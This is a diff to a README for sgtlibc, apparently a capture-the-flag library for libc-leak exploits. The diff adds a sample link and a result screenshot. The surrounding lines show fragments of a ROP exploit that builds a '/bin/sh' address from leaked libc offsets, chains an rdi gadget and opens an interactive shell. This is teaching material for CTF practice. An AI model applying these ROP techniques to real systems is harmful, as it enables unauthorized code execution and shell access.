@@ -116,6 +116,10 @@ binsh_addr = p64(libc[sgtlibc.s_binsh] + offset)
 
 ## CTF Problem Solve DEMO
 
+[view all sameple files](https://github.com/serfend/sgtlibc/tree/main/samples/libc-leak/x64-babyrop)
+
+- use exploit code
+
 ```python
 import sgtlibc
 from sgtlibc.gamebox import *
@@ -148,6 +152,10 @@ payload = payload_exp + p00(elf.rop['rdi']) + p00(binsh_addr) + \
 sl(payload)
 interactive()
 ```
+
+- result
+
+![image-20220609134743902](https://raw.githubusercontent.com/serfend/res.image.reference/main/image-20220609134743902.png)
 
 
 
